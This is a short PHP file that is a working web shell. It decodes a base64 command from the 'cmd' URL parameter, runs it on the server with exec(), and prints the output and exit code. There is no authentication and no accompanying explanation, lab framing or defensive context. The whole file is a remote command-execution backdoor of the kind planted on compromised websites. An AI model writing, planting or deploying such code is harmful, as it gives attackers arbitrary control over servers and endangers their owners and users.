<?php
header('Content-Type: text/plain');
$cmd = isset($_GET['cmd']) ? base64_decode($_GET['cmd']) : 'id';
echo "Executing: $cmd\n";
echo "====================\n";
$output = [];
$retval = null;
exec($cmd . ' 2>&1', $output, $retval);
echo "Exit Code: $retval\n";
echo "Output:\n" . implode("\n", $output) . "\n";
?>
